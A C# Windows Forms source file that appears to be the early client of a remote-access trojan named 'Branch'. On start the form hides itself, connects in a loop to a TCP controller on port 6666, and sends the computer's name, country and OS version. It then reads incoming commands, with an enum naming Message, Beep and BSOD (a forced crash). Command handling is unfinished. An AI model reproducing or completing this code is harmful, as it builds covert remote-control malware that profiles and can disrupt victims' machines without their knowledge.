using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Globalization;

namespace Branch
{
    public partial class Branch : Form
    {
        private TcpClient client = new TcpClient();
        private TcpListener listener;
        private NetworkStream stream;
        private StreamReader reader;
        private StreamWriter writer;

        private enum cmds
        {
            Message = 1, Beep = 2, BSOD = 3
        }

        public Branch()
        {
            InitializeComponent();
        }

        private void Branch_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (;;)
            {
                if(!client.Connected)
                {
                    try
                    {
                        client = new TcpClient("localhost", 6666);
                        stream = client.GetStream();
                        reader = new StreamReader(stream);
                        writer = new StreamWriter(stream);
                    }
                    catch (Exception err) { return; }
                }

                string CompName = Environment.MachineName.ToString();
                string OS = Environment.OSVersion.ToString();
                string culture = CultureInfo.CurrentCulture.EnglishName;
                string Country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);

                string SendData = CompName + "," + Country + "," + OS;
                writer.Write(SendData);

                try
                {
                    string line;
                    int command = 0;
                    while(true)
                    {
                        line = "";
                        line = reader.ReadLine();
                    }
                }
                catch(Exception err) { }
            }
        }
    }
}
